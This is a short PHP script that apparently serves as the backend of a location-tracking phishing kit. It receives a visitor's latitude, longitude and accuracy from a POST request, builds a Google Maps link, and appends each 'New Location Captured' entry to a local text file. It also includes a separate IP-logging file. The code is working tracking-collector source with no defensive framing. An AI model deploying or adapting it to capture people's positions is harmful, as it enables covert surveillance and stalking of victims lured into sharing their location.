<?php
include 'ip.php';

// ---------- PART 1: HANDLE POST (SAVE LOCATION) ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $date = date('dMYHis');
    $latitude  = $_POST['latitude'] ?? 'Unknown';
    $longitude = $_POST['longitude'] ?? 'Unknown';
    $accuracy  = $_POST['accuracy'] ?? 'Unknown';

    if (!empty($latitude) && !empty($longitude)) {
        $data =
            "Latitude: $latitude\r\n" .
            "Longitude: $longitude\r\n" .
            "Accuracy: $accuracy meters\r\n" .
            "Google Maps: https://www.google.com/maps/place/$latitude,$longitude\r\n" .
            "Date: $date\r\n";

        file_put_contents("locations.txt",
            "\n=== New Location Captured ===\n$data\n",
            FILE_APPEND
        );

        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
        exit;
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error']);
        exit;
    }
}
?>